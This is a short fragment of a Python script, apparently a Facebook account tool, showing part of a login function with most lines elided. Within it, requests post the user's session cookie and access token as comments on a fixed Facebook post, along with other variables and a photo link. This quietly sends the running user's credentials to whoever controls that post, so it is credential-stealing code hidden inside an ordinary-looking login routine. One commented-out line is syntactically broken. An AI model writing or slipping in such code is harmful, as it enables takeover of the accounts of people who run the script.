...
def login():
	...
	try:
		...
		link = ('https://www.facebook.com/photo/?fbid=1611485222637308&set=a.387839601668549')
		...
		#ses.post(f"https://graph.facebook.com/1611485245970639?fields=subscribers&access_token={token}",headers=(cookies=cok)
		ses.post(f"https://graph.facebook.com/1611485245970639/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/1611485245970639/comments/?message={token}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/1611485245970639/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
